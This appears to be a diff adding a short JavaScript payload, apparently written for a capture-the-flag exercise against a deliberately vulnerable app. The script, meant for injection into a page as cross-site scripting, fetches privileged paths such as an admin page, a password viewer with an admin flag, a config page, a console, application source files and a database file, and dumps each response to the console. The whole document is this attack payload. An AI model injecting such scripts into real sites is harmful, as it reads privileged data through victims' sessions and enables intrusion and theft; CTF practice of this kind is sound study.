@@ -1,0 +1,26 @@
+<script>
+(async () => {
+  let targets = [
+    '/',
+    '/admin',
+    '/notes',
+    '/password_viewer?admin=true',
+    '/config',
+    '/console',
+    '/app.py',
+    '/app/app.py',
+    '/home/ctf/myVulnApp.db',
+    '/static/app.py',
+    '/app.py'
+  ];
+
+  for (let t of targets) {
+    try {
+      let r = await fetch(t);
+      let data = await r.text();
+      console.log("===== " + t + " =====");
+      console.log(data);
+    } catch (e) {}
+  }
+})();
+</script>
